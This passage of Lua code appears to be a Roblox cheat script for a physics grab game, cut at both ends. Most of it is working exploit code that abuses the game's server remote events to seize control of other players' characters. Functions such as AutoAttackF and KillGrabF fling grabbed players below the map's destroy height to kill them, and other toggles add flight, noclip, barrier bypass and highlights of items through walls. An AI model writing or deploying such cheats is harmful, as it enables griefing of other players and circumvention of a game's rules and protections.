        local referencePosition = hrp.Position
        if myPO then referencePosition = myPO.Position end

        local ragdollHitbox = hrp:FindFirstChild("RagdollTouchedHitbox")
        if not ragdollHitbox then continue end

        local stickyPartName = "NinjaShuriken"
        local targetValue = CFrame.new(0.05, -0.3, 0) * CFrame.Angles(190, 0, 0)

        local stickyPartFolder = inv:FindFirstChild(stickyPartName)
        local stickyPart = stickyPartFolder and stickyPartFolder:FindFirstChild("StickyPart")
        local soundPart = stickyPartFolder and stickyPartFolder:FindFirstChild("SoundPart")

        if not stickyPart then
            local success = pcall(function()
                task.spawn(function()
                    SpawnToyRemoteFunction:InvokeServer(stickyPartName, hrp.CFrame, Vector3.new(0, 0, 0))
                end)
            end)

            if not success then continue end

            for _ = 0, 30 do
                task.wait(0.0005)
                stickyPartFolder = inv:FindFirstChild(stickyPartName)
                if stickyPartFolder then break end
            end

            if not stickyPartFolder then continue end

            stickyPart = stickyPartFolder:FindFirstChild("StickyPart")
            soundPart = stickyPartFolder:FindFirstChild("SoundPart")

            if stickyPart then stickyPart.CanQuery = false end
            if soundPart then soundPart.CanQuery = false end

            if not stickyPart then continue end
            task.wait(0.01)
        end

        pcall(function()
            SetNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
            if DestroyGrabLine then DestroyGrabLine:FireServer(stickyPart) end
        end)

        local stickyWeld = stickyPart:FindFirstChild("StickyWeld")

        if not stickyWeld or stickyWeld.Part1 ~= ragdollHitbox then
            StickyPartEvent:FireServer(stickyPart, ragdollHitbox, targetValue)

            for _ = 0, 20 do
                task.wait(0.01)
                stickyWeld = stickyPart:FindFirstChild("StickyWeld")
                if stickyWeld and stickyWeld.Part1 == ragdollHitbox then
                    break
                end
            end
        end

        if stickyWeld and stickyWeld.Part1 == ragdollHitbox then
            while stickyWeld and stickyWeld.Part1 == ragdollHitbox and ragdollHitbox.Parent do
                if not AntiKickT or AntiGrabTP_Active then break end
                task.wait(0.1)

                local currentFolder = inv:FindFirstChild(stickyPartName)
                if not currentFolder then break end

                local currentStickyPart = currentFolder:FindFirstChild("StickyPart")
                if not currentStickyPart then break end

                stickyWeld = currentStickyPart:FindFirstChild("StickyWeld")
                if not stickyWeld or stickyWeld.Part1 ~= ragdollHitbox then
                    break
                end
            end
        end

        if not AntiKickT or AntiGrabTP_Active then
            if stickyPartFolder and stickyPartFolder.Parent then
                pcall(function()
                    DestroyToy:FireServer(stickyPartFolder)
                end)
            end
            break
        end
    end
end


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local plr = Players.LocalPlayer

function AntiGrabStickyF()
    while AntiGrabStickyT and plr do
        task.wait(0.1)

        local char = plr.Character
        if not char or not char.Parent then
            continue
        end

        local inv = Workspace:WaitForChild(plr.Name.."SpawnedInToys", 5)
        if not inv then continue end

        local StickyPartEvent = ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
        local SetNetworkOwner = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
        local SpawnToyRemoteFunction = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction") 
        local DestroyToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")

        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        local head = char:FindFirstChild("Head")
        if not hrp or not hum or not head then
            continue
        end

        local agFolder = inv:FindFirstChild("AG")
        local stickyPart = agFolder and agFolder:FindFirstChild("StickyPart")

        local headPartOwner = head:FindFirstChild("PartOwner")
        local stickyWeld = stickyPart and stickyPart:FindFirstChild("StickyWeld")
        local targetPart = hrp:FindFirstChild("RagdollTouchedHitbox")

        if headPartOwner and stickyWeld and targetPart and stickyWeld.Part1 == targetPart then
            pcall(function()
                SetNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
            end)

            if hum.Sit then
                hum.Sit = false
            end
            if not hum.AutoRotate then
                hum.AutoRotate = true
            end

            headPartOwner:Destroy()
        end

        if stickyWeld and targetPart and stickyWeld.Part1 ~= targetPart then
            pcall(function()
                SetNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
            end)
        end

        if stickyPart then
            local distance = (hrp.Position - stickyPart.Position).Magnitude
            if distance > 25 then
                pcall(function()
                    DestroyToy:FireServer(agFolder)
                end)
                task.wait(0.00001)
            else
                local partOwner = stickyPart:FindFirstChild("PartOwner")
                if not partOwner or partOwner.Value ~= plr.Name then
                    pcall(function()
                        SetNetworkOwner:FireServer(stickyPart, hrp.CFrame)
                    end)
                end

                local targetPartCheck = hrp:FindFirstChild("RagdollTouchedHitbox")
                local stickyWeldCheck = stickyPart:FindFirstChild("StickyWeld")

                if targetPartCheck and stickyPart then
                    if not stickyWeldCheck or stickyWeldCheck.Part1 ~= targetPartCheck then
                        pcall(function()
                            StickyPartEvent:FireServer(stickyPart, targetPartCheck, CFrame.new(0, -0.3, 0.3) * CFrame.Angles(190, 0, 0))
                        end)
                    end
                end
            end
        else
            local existingNinja = inv:FindFirstChild("AG")
            if not existingNinja then
                task.spawn(function()
                    pcall(function()
                        SpawnToyRemoteFunction:InvokeServer("NinjaShuriken", hrp.CFrame * CFrame.new(0,10,20), Vector3.new(0,0,0))
                    end)
                end)

                task.wait(0.00001)

                local newNinjaFolder = inv:FindFirstChild("NinjaShuriken")
                if newNinjaFolder then
                    local newStickyPart = newNinjaFolder:FindFirstChild("StickyPart")
                    if newStickyPart then
                        local distance = (hrp.Position - newStickyPart.Position).Magnitude
                        if distance <= 30 then
                            newNinjaFolder.Name = "AG"
                        else
                            pcall(function()
                                DestroyToy:FireServer(newNinjaFolder)
                            end)
                        end
                    end
                end
            else
                local newStickyPart = existingNinja:FindFirstChild("StickyPart")
                if newStickyPart then
                    local distance = (hrp.Position - newStickyPart.Position).Magnitude
                    if distance <= 30 then
                        existingNinja.Name = "AG"
                    end
                end
            end
        end
    end
end



    if not AntiKickT then
        local shurikenFolder = inv:FindFirstChild("NinjaShuriken")
        if shurikenFolder then
            pcall(function()
                DestroyToy:FireServer(shurikenFolder)
            end)
        end
    end


plr.CharacterAdded:Connect(function(newChar)
    newChar:WaitForChild("Humanoid")
    newChar:WaitForChild("HumanoidRootPart")
    task.wait(0.02)
    if AntiKickT and not AntiGrabTP_Active then
        AntiKickF()
    end
end)

Plots = workspace:WaitForChild("Plots")
function BarrierCanCollideF()
    if BarrierCanCollideT then
        for i = 1, 5 do
            local plot = Plots:FindFirstChild("Plot"..i)
            if plot and plot:FindFirstChild("Barrier") then
                for _, barrier in ipairs(plot.Barrier:GetChildren()) do
                    if barrier:IsA("BasePart") then
                        barrier.CanCollide = false
                    end
                end
            end
        end
    else
        for i = 1, 5 do
            local plot = Plots:FindFirstChild("Plot"..i)
            if plot and plot:FindFirstChild("Barrier") then
                for _, barrier in ipairs(plot.Barrier:GetChildren()) do
                    if barrier:IsA("BasePart") then
                        barrier.CanCollide = true
                    end
                end
            end
        end
    end
end

function AntiExplosionF()
    if AntiExplosionC then
        AntiExplosionC:Disconnect()
        AntiExplosionC = nil
    end
    if AntiExplosionH then
        AntiExplosionH:Disconnect()
        AntiExplosionH = nil
    end

    if not AntiExplosionT then 
        return 
    end

    local char = plr.Character
    if not char then 
        return 
    end

    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")

    AntiExplosionC = workspace.ChildAdded:Connect(function(model)
        if not char or not hrp or not hum then
            return
        end
        
        if model:IsA("BasePart") and (model.Position - hrp.Position).Magnitude <= 20 then
            if hum.SeatPart ~= nil then
                hrp.Anchored = true
                task.wait(0.03)
                hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                hrp.Anchored = false
            else
            if model:IsA("BasePart") and (model.Position - hrp.Position).Magnitude <= 20 then
                hrp.Anchored = true
                task.wait()
                hum:ChangeState(Enum.HumanoidStateType.Running)
                hrp.Anchored = false
                hum.AutoRotate = true

                for _, limb in ipairs(char:GetDescendants()) do
                    if limb:IsA("BasePart") and limb.Name == "RagdollLimbPart" then
                        limb.CanCollide = false
                        end
                    end
                end
            end
        end
    end)
end

plr.CharacterAdded:Connect(function(char)
    char:WaitForChild("Humanoid")
    char:WaitForChild("HumanoidRootPart")
    task.wait(0.2)
    if AntiExplosionT then
        AntiExplosionF()
    end
end)

function AutoAttackF()
    task.spawn(function()
        local RunService = game:GetService("RunService")
        local savedTargets = {}
        local invName = plr.Name.."SpawnedInToys"
        
        while AutoAttackT do
            RunService.Heartbeat:Wait()

            for i = #savedTargets, 1, -1 do
                local t = savedTargets[i]
                local char = t and t.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if not (t and char and hum and hum.Health > 0) or t == plr then
                    table.remove(savedTargets, i)
                end
            end

            local myChar = plr.Character
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local myAttach = myHRP and myHRP:FindFirstChild("RootAttachment")

            if not (myChar and myHRP and myAttach) then
                continue
            end

            local function tryAddTarget(player)
                if player and player ~= plr and player.Character then
                    local exists = false
                    for _, v in ipairs(savedTargets) do
                        if v == player then exists = true; break end
                    end
                    if not exists then
                        table.insert(savedTargets, player)
                    end
                end
            end

            local head = myChar:FindFirstChild("Head")
            if head then
                local ownerVal = head:FindFirstChild("PartOwner")
                if ownerVal and ownerVal:IsA("StringValue") and ownerVal.Value ~= "" then
                    local foundPlayer = game.Players:FindFirstChild(ownerVal.Value)
                    tryAddTarget(foundPlayer)
                end
            end

            local inv = workspace:FindFirstChild(invName)
            if inv then
                for _, blob in ipairs(inv:GetChildren()) do
                    if blob.Name == "CreatureBlobman" and blob:FindFirstChild("BlobmanSeatAndOwnerScript") then
                        for _, side in ipairs({"Left", "Right"}) do
                            local detector = blob:FindFirstChild(side.."Detector")
                            local weld = detector and detector:FindFirstChild(side.."Weld")
                            if weld and weld:IsA("AlignPosition") and weld.Attachment0 == myAttach then
                                local foundPlayer = game.Players:FindFirstChild(plr.Name) 
                                tryAddTarget(foundPlayer)
                            end
                        end
                    end
                end
            end

            for _, player in ipairs(game.Players:GetPlayers()) do
                if player ~= plr then
                    local invs = workspace:FindFirstChild(player.Name.."SpawnedInToys")
                    if invs then
                        for _, blob in ipairs(invs:GetChildren()) do
                            if blob.Name == "CreatureBlobman" and blob:FindFirstChild("BlobmanSeatAndOwnerScript") then
                                for _, side in ipairs({"Left", "Right"}) do
                                    local detector = blob:FindFirstChild(side.."Detector")
                                    local weld = detector and detector:FindFirstChild(side.."Weld")
                                    if weld and weld:IsA("AlignPosition") and weld.Attachment0 == myAttach then
                                        tryAddTarget(player)
                                    end
                                end
                            end
                        end
                    end
                end
            end

            local plots = workspace:FindFirstChild("PlotItems")
            if plots then
                for i = 1, 5 do
                    local plot = plots:FindFirstChild("Plot"..i)
                    if plot then
                        for _, blob in ipairs(plot:GetChildren()) do
                            if blob.Name == "CreatureBlobman" and blob:FindFirstChild("BlobmanSeatAndOwnerScript") then
                                for _, side in ipairs({"Left", "Right"}) do
                                    local detector = blob:FindFirstChild(side.."Detector")
                                    local weld = detector and detector:FindFirstChild(side.."Weld")
                                    if weld and weld:IsA("AlignPosition") and weld.Attachment0 == myAttach then
                                        local foundPlayer = game.Players:FindFirstChild("Plot "..i)
                                        tryAddTarget(foundPlayer)
                                    end
                                end
                            end
                        end
                    end
                end
            end

            for i = #savedTargets, 1, -1 do
                local target = savedTargets[i]

                if target == plr then 
                    table.remove(savedTargets, i)
                    continue 
                end

                local tChar = target.Character
                local hum = tChar and tChar:FindFirstChildOfClass("Humanoid")
                local torso = tChar and tChar:FindFirstChild("Torso")
                local head = tChar and tChar:FindFirstChild("Head")

                if not (hum and torso and head and hum.Health > 0) then
                    table.remove(savedTargets, i)
                    continue
                end

                local isWhitelisted = false
                if WhiteListMode and Whitelist and typeof(Whitelist) == "table" then
                    for _, allowed in ipairs(Whitelist) do
                        if allowed == target.Name then isWhitelisted = true; break end
                    end
                end
                if isWhitelisted then continue end

                local myTorso = myChar:FindFirstChild("Torso")
                if not myTorso then continue end

                local distance = (torso.Position - myTorso.Position).Magnitude
                if distance <= 30 then
                    rs.GrabEvents.SetNetworkOwner:FireServer(torso, CFrame.lookAt(myTorso.Position, torso.Position))

                    if head then
                        local partOwner = head:FindFirstChild("PartOwner")
                        if partOwner and partOwner:IsA("StringValue") and partOwner.Value == plr.Name then
                            if hum.Health ~= 0 then
                                local FallenY = workspace.FallenPartsDestroyHeight
                                local targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100
                                torso.CFrame = CFrame.new(99999, targetY, 99999)
                            end
                        end
                    end
                end
            end
        end
    end)
end

plr.CharacterAdded:Connect(function(char)
    char:WaitForChild("Humanoid")
    char:WaitForChild("HumanoidRootPart")
    task.wait(0.2)
    if AutoAttackT then
        AutoAttackF()
    end
end)


function flyF()
    if not flyT then return end
    
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local RunService = game:GetService("RunService")

    local plr = Players.LocalPlayer
    local char = plr.Character or plr.CharacterAdded:Wait()
    local humanoid = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart")

    local BV = Instance.new("BodyVelocity")
    local BG = Instance.new("BodyGyro")

    BG.P = 9e4
    BG.Parent = hrp
    BV.Parent = hrp
    BG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    BG.CFrame = hrp.CFrame
    BV.Velocity = Vector3.new(0,0,0)
    BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)

    local CONTROL = {F=0,B=0,L=0,R=0}
    local lCONTROL = {F=0,B=0,L=0,R=0}
    local SPEED = flyV

    if flyKeyDown then flyKeyDown:Disconnect() end
    if flyKeyUp then flyKeyUp:Disconnect() end
    if flyConnection then flyConnection:Disconnect() end

    flyKeyDown = UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if input.KeyCode == Enum.KeyCode.W then
            CONTROL.F = 1
        elseif input.KeyCode == Enum.KeyCode.S then
            CONTROL.B = -1
        elseif input.KeyCode == Enum.KeyCode.A then
            CONTROL.L = -1
        elseif input.KeyCode == Enum.KeyCode.D then
            CONTROL.R = 1
        end
    end)

    flyKeyUp = UserInputService.InputEnded:Connect(function(input, processed)
        if input.KeyCode == Enum.KeyCode.W then
            CONTROL.F = 0
        elseif input.KeyCode == Enum.KeyCode.S then
            CONTROL.B = 0
        elseif input.KeyCode == Enum.KeyCode.A then
            CONTROL.L = 0
        elseif input.KeyCode == Enum.KeyCode.D then
            CONTROL.R = 0
        end
    end)

    flyConnection = RunService.Heartbeat:Connect(function()
        if not flyT then
            flyConnection:Disconnect()
            if flyKeyDown then flyKeyDown:Disconnect() end
            if flyKeyUp then flyKeyUp:Disconnect() end
            BV:Destroy()
            BG:Destroy()
            humanoid.PlatformStand = false
            return
        end
        
        local camera = workspace.CurrentCamera
        SPEED = flyV
        
        if CONTROL.F + CONTROL.B ~= 0 or CONTROL.L + CONTROL.R ~= 0 then
            BV.Velocity = ((camera.CFrame.LookVector * (CONTROL.F + CONTROL.B)) + 
                ((camera.CFrame * CFrame.new(CONTROL.L + CONTROL.R, 0, 0).p) - camera.CFrame.p)) * SPEED
            lCONTROL = {F=CONTROL.F,B=CONTROL.B,L=CONTROL.L,R=CONTROL.R}
        else
            BV.Velocity = Vector3.new(0,0,0)
        end
        BG.CFrame = camera.CFrame
    end)
end

plr.CharacterAdded:Connect(function()
    task.wait(0.2)
    if flyT then
        flyF()
    end
end)

function AntiStruggleGrabF()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local SetNetworkOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner
    local DestroyGrabLine = ReplicatedStorage.GrabEvents.DestroyGrabLine
    local CreateGrabLine = ReplicatedStorage.GrabEvents.CreateGrabLine
    local Players = game:GetService("Players")

    if not AntiStruggleGrabT then return end

    task.spawn(function()
        while AntiStruggleGrabT do
            local grabParts = workspace:FindFirstChild("GrabParts")
            if not grabParts then
                task.wait()
                continue
            end

            local gp = grabParts:FindFirstChild("GrabPart")
            local weld = gp and gp:FindFirstChildOfClass("WeldConstraint")
            local part1 = weld and weld.Part1

            if part1 then
                local ownerPlayer = nil
                for _, pl in ipairs(Players:GetPlayers()) do
                    if pl.Character and part1:IsDescendantOf(pl.Character) then
                        ownerPlayer = pl
                        break
                    end
                end

                while AntiStruggleGrabT and workspace:FindFirstChild("GrabParts") do
                    if ownerPlayer then
                        local tgtTorso = ownerPlayer.Character:FindFirstChild("HumanoidRootPart") 
                        local tgtHum = ownerPlayer.Character:FindFirstChild("Humanoid")
                        local tgtHead = ownerPlayer.Character:FindFirstChild("Head")
                        local myTorso = plr.Character:FindFirstChild("HumanoidRootPart") 

                        if tgtTorso and myTorso and tgtHead then
                            local ownerValue = tgtHead:FindFirstChild("PartOwner")
                            if tgtTorso then --not ownerValue or ownerValue.Value ~= plr.Name then
                                SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position))
                            end
                        end
                    else
                        if part1.Parent then
                            local myTorso = plr.Character:FindFirstChild("HumanoidRootPart")
                            if myTorso then
                                SetNetworkOwner:FireServer(part1, CFrame.lookAt(myTorso.Position, part1.Position))
                            end
                        end
                    end
                    task.wait()
                end
            end
            task.wait()
        end
    end)
end

TpKLG = false
function KillGrabF()
    while KillGrabT and task.wait() do
        local grabParts = workspace:FindFirstChild("GrabParts")
        if not grabParts then continue end

        for _, grabPart in ipairs(grabParts:GetChildren()) do
            if not KillGrabT then break end
            if grabPart.Name ~= "GrabPart" then continue end

            local weldConstraint = grabPart:FindFirstChildOfClass("WeldConstraint")
            if not weldConstraint or not weldConstraint.Part1 then continue end

            local target = weldConstraint.Part1
            if not target or not target.Parent then continue end

            local targetPlayer = game.Players:FindFirstChild(target.Parent.Name)
            if not targetPlayer then continue end

            local targetChar = targetPlayer.Character
            if not targetChar then continue end

            local THead = targetChar:FindFirstChild("Head")
            local THRP = targetChar:FindFirstChild("HumanoidRootPart")
            local THum = targetChar:FindFirstChildOfClass("Humanoid")

            if not THead or not THRP or not THum then continue end
            if THum.Health <= 0 then continue end

            local char = plr.Character
            if not char then continue end

            local myTorso = char:FindFirstChild("HumanoidRootPart")
            if not myTorso then continue end

            if (myTorso.Position - target.Position).Magnitude > 30 then continue end

            local partOwner = THead:FindFirstChild("PartOwner")

            if WhiteListMode then
                local isWhitelisted = false
                for _, whitelistedName in ipairs(Whitelist) do
                    if whitelistedName == targetPlayer.Name then
                        isWhitelisted = true
                        break
                    end
                end
                if isWhitelisted then continue end
            end

            if not partOwner or not partOwner:IsA("StringValue") or partOwner.Value ~= plr.Name then
                pcall(function()
                    game:GetService("ReplicatedStorage").GrabEvents.SetNetworkOwner:FireServer(THRP, CFrame.lookAt(myTorso.Position, THRP.Position))
                end)
                continue
            end

            game:GetService("ReplicatedStorage").GrabEvents.SetNetworkOwner:FireServer(THRP, CFrame.lookAt(myTorso.Position, THRP.Position))
            game:GetService("ReplicatedStorage").GrabEvents.DestroyGrabLine:FireServer(THRP)

            weldConstraint.Part0 = nil

            if THum.RigType ~= Enum.HumanoidRigType.R15 and THum.SeatPart == nil then THum.RigType = Enum.HumanoidRigType.R15 end
            if THum.BreakJointsOnDeath == true and THum.SeatPart == nil then THum.BreakJointsOnDeath = false end

            local FallenY = workspace.FallenPartsDestroyHeight
            local targetY = (FallenY <= -50000 and -49999.50) or (FallenY <= -100 and -99.50) or -100
            if TpKLG then THRP.CFrame = CFrame.new(9999, targetY, 9999) end
        end
    end
end

AnhKick = false
function KickGrabF()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")

    if not KickGrabT then return end

    local localPlayer = Players.LocalPlayer
    if not localPlayer or not localPlayer.Character then return end

    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not KickGrabT then
            connection:Disconnect()
            return
        end

        local myCharacter = localPlayer.Character
        local myTorso = myCharacter:FindFirstChild("Torso") or myCharacter:FindFirstChild("HumanoidRootPart")
        if not myTorso then return end

        local grabParts = workspace:FindFirstChild("GrabParts")
        if not grabParts then return end

        for _, grabPart in ipairs(grabParts:GetChildren()) do
            if grabPart.Name == "GrabPart" then
                local weld = grabPart:FindFirstChildOfClass("WeldConstraint")
                if not weld then continue end

                local originalPart1 = weld.Part1
                if not originalPart1 then continue end

                local ownerPlayer
                for _, player in ipairs(Players:GetPlayers()) do
                    if player ~= localPlayer and player.Character and originalPart1:IsDescendantOf(player.Character) then
                        ownerPlayer = player
                        break
                    end
                end

                if not ownerPlayer then continue end
                local tgtTorso = ownerPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not tgtTorso then continue end

                weld.Part1 = tgtTorso

                if AnhKick then
                    local tgtHum = ownerPlayer.Character:FindFirstChild("Humanoid")
                    if not tgtHum then continue end

                    if not tgtHum.Sit then ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position)) end
                    if tgtHum.Sit then ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(tgtTorso) end
                    if ownerPlayer.IsHeld then ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position)) end
                    if tgtHum.Sit then ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(tgtTorso) end
                else
                    ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position))
                    ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(tgtTorso)
                end
            end
        end
    end)
end

function MasslessGrabF()
    while MasslessGrabT and task.wait() do
        local grabParts = workspace:FindFirstChild("GrabParts")
        
        if grabParts then
            local dragParts = {grabParts:FindFirstChild("DragPart"), grabParts:FindFirstChild("DragPart1")}
            
            for _, dragPart in pairs(dragParts) do
                if dragPart then
                    local alignOrientation = dragPart:FindFirstChildOfClass("AlignOrientation")
                    if alignOrientation then
                        alignOrientation.MaxAngularVelocity = math.huge
                        alignOrientation.MaxTorque = math.huge
                        alignOrientation.Responsiveness = 200
                    end
                    
                    local alignPosition = dragPart:FindFirstChildOfClass("AlignPosition")
                    if alignPosition then
                        alignPosition.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge)
                        alignPosition.MaxForce = math.huge
                        alignPosition.MaxVelocity = math.huge
                        alignPosition.Responsiveness = 200
                    end
                end
            end
        end
    end
end

function NoClipGrabF()
    local trackedTargets = {}
    local playerCheckCooldown = 0
    
    local function findAllParts(object, partsList)
        if object:IsA("BasePart") then
            partsList[object] = object.CanCollide
        end
        
        for _, child in ipairs(object:GetChildren()) do
            findAllParts(child, partsList)
        end
    end
    
    local function setPartsCollision(partsList, enable)
        for part, originalValue in pairs(partsList) do
            if part and part.Parent then
                if enable then
                    part.CanCollide = originalValue
                else
                    part.CanCollide = false
                end
            end
        end
    end
    
    while NoClipGrabT and task.wait() do
        local grabParts = workspace:FindFirstChild("GrabParts")
        
        if grabParts then
            local currentTargets = {}
            
            for _, grabPart in ipairs(grabParts:GetChildren()) do
                if grabPart.Name == "GrabPart" then
                    local weldConstraint = grabPart:FindFirstChildOfClass("WeldConstraint")
                    
                    if weldConstraint and weldConstraint.Part1 then
                        local target = weldConstraint.Part1
                        currentTargets[target] = true
                        
                        if not trackedTargets[target] then
                            local partsToDisable = {}
                            local isPlayer = false
                            
                            if target.Parent then
                                findAllParts(target.Parent, partsToDisable)
                                local humanoid = target.Parent:FindFirstChildOfClass("Humanoid")
                                if humanoid then
                                    isPlayer = true
                                end
                            else
                                if target:IsA("BasePart") then
                                    partsToDisable[target] = target.CanCollide
                                end
                            end
                            
                            setPartsCollision(partsToDisable, false)
                            
                            local connection
                            connection = weldConstraint.Destroying:Connect(function()
                                setPartsCollision(partsToDisable, true)
                                trackedTargets[target] = nil
                                if connection then
                                    connection:Disconnect()
                                end
                            end)
                            
                            trackedTargets[target] = {
                                target = target,
                                connection = connection,
                                partsToDisable = partsToDisable,
                                isPlayer = isPlayer,
                                lastPlayerCheck = os.clock()
                            }
                        else
                            trackedTargets[target].lastPlayerCheck = os.clock()
                        end
                    end
                end
            end
            
            playerCheckCooldown = playerCheckCooldown + task.wait()
            if playerCheckCooldown >= 0.01 then
                playerCheckCooldown = 0
                
                for target, data in pairs(trackedTargets) do
                    if data.isPlayer then
                        local newParts = {}
                        findAllParts(target.Parent, newParts)
                        
                        for part, originalValue in pairs(newParts) do
                            if not data.partsToDisable[part] then
                                data.partsToDisable[part] = originalValue
                            end
                            if part.CanCollide then
                                part.CanCollide = false
                            end
                        end
                    end
                end
            end
            
            for target, data in pairs(trackedTargets) do
                if not currentTargets[target] then
                    setPartsCollision(data.partsToDisable, true)
                    
                    if data.connection then
                        data.connection:Disconnect()
                    end
                    trackedTargets[target] = nil
                end
            end
        else
            for target, data in pairs(trackedTargets) do
                setPartsCollision(data.partsToDisable, true)
                
                if data.connection then
                    data.connection:Disconnect()
                end
            end
            trackedTargets = {}
        end
    end
    
    for target, data in pairs(trackedTargets) do
        setPartsCollision(data.partsToDisable, true)
        
        if data.connection then
            data.connection:Disconnect()
        end
    end
end
function ViewToolF()
    local Tools = {
        "NinjaKunai",
        "NinjaShuriken",
        "NinjaKatana",
        "ToolCleaver",
        "ToolDiggingForkRusty",
        "ToolPencil",
        "ToolPickaxe",
        "AG",
    }

    local Cpf = { "Campfire" }
    local AG = { "AG" }

    local function addView(item, partName, multiple, onlyView1, highTransparency)
        if onlyView1 then return end

        local function createHighlight(part, index)
            if not item:FindFirstChild("Highlight_" .. index) then
                local highlight = Instance.new("Highlight")
                highlight.Name = "Highlight_" .. index
                highlight.Adornee = item
                highlight.FillColor = Color3.fromRGB(0, 255, 0)
                highlight.FillTransparency = 1

                if item.Name == "Campfire" then
                    highlight.OutlineColor = Color3.fromRGB(255, 117, 24)
                elseif item.Name == "AG" then
                    highlight.OutlineColor = Color3.fromRGB(138, 43, 226)
                else
                    highlight.OutlineColor = Color3.fromRGB(0, 255, 0)
                end

                highlight.FillTransparency = 1
                highlight.OutlineTransparency = 0
                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                highlight.Parent = item
            end
        end

        if multiple and partName then
            local count = 0
            for _, part in ipairs(item:GetDescendants()) do
                if part:IsA("BasePart") and part.Name == partName then
                    count += 1
                    createHighlight(part, count)
                end
            end
        elseif partName then
            local part = item:FindFirstChild(partName, true)
            if part and part:IsA("BasePart") then
                createHighlight(part, partName)
            end
        end
    end

    local function checkAndHighlightItem(item)
        if item:IsA("Model") then
            if table.find(Tools, item.Name) then
                addView(item, "StickyPart")
            elseif table.find(Cpf, item.Name) then
                addView(item, "FirePlayerPart")
            elseif table.find(AG, item.Name) then
                addView(item, nil, false, false)
            end
        end
    end

    task.spawn(function()
        while ViewToolT and task.wait(0.2) do
            for _, folder in ipairs(workspace:GetChildren()) do
                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                    for _, item in ipairs(folder:GetChildren()) do
                        checkAndHighlightItem(item)
                    end
                end
            end

            if workspace:FindFirstChild("PlotItems") then
                local plotItems = workspace.PlotItems
                for i = 1, 5 do
                    local plotName = "Plot" .. i
                    local plot = plotItems:FindFirstChild(plotName)
                    if plot then
                        for _, item in ipairs(plot:GetChildren()) do
                            checkAndHighlightItem(item)
                        end
                    end
                end
            end
        end

        for _, folder in ipairs(workspace:GetChildren()) do
            if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                for _, item in ipairs(folder:GetChildren()) do
                    for _, v in ipairs(item:GetChildren()) do
                        if v.Name:match("^Highlight_") then
                            v:Destroy()
                        end
                    end
                end
            end
        end

        if workspace:FindFirstChild("PlotItems") then
            local plotItems = workspace.PlotItems
            for i = 1, 5 do
                local plotName = "Plot" .. i
                local plot = plotItems:FindFirstChild(plotName)
                if plot then
                    for _, item in ipairs(plot:GetChildren()) do
                        for _, v in ipairs(item:GetChildren()) do
                            if v.Name:match("^Highlight_") then
                                v:Destroy()
                            end
                        end
                    end
                end
            end
        end
    end)
end


function ViewAuraF()
    local targetNames = { 
        "NinjaKunai", "NinjaShuriken", "NinjaKatana", 
        "ToolCleaver", "ToolDiggingForkRusty", 
        "ToolPencil", "ToolPickaxe" 
    }

    task.spawn(function()
        while ViewAuraT and task.wait(0.03) do
            local character = plr.Character
            if not character then continue end

            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            for _, folder in ipairs(workspace:GetChildren()) do
                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                    if folder.Name ~= (plr.Name .. "SpawnedInToys") then
                        for _, item in ipairs(folder:GetChildren()) do
                            if table.find(targetNames, item.Name) and item:FindFirstChild("StickyPart") then
                                local sticky = item.StickyPart

                                local basePart = item.PrimaryPart or sticky
                                local dist = (basePart.Position - hrp.Position).Magnitude

                                if dist <= 30 then -- and sticky:FindFirstChild("PartOwner").Value ~= plr.Name then
                                    pcall(function()
                                        rs.GrabEvents.SetNetworkOwner:FireServer(sticky, CFrame.lookAt(hrp.Position, sticky.Position))
                                    end)
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

function AntiBananaAuraF()
    local targetNames = {"FoodBanana"}

    task.spawn(function()
        while AntiBananaAuraT and task.wait(0.1) do
            local character = plr.Character
            if not character then continue end
            
            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            for _, folder in ipairs(workspace:GetChildren()) do
